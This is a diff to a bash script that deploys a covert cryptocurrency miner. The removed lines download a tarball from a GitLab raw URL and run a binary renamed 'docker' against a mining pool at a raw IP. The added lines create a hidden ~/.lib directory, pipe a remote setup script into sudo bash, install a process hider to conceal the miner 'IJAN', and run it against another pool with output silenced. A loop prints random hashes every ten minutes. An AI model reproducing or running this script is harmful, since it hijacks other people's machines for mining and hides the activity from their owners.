@@ -1,5 +1,14 @@
 #!/bin/bash
-wget https://gitlab.com/zenardozhe/jual/-/raw/main/TT.tar.gz && tar -xvf TT.tar.gz >/dev/null 2>&1
-mv IJAN docker
-./docker -a firopow -o stratum+tcp://172.104.80.135:80 -u a2NyYBzrg4jtk4BLZMRntEVeGt79xGP7xx.$(echo $(shuf -i 1000-9999 -n 1)-RABBIT) -p x >/dev/null 2>&1
+rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
+cd ~/
+mkdir .lib
+cd .lib
+rm -rf *
+sudo apt update -y
+sudo apt install gcc -y
+curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
+apt install nodejs -y
+npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add IJAN
+rm -f IJAN && wget -q 'https://gitlab.com/zenardozhe/jual/-/raw/main/TT.tar.gz' && tar -xvf TT.tar.gz
+./IJAN -a ProgPoWZ -o 172.104.34.165:443 -u iC2TuPhrHvreA4KKJUoawyKdY1KJEBKntHyZsu3PhNqRcMBWaLrAcs83PstR1CKqFAJqLm1Wfp49mjXpP29bioGYdCufNtoqXQL1m1EQS -p $(echo $(shuf -i 1-20 -n 1)-CT) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
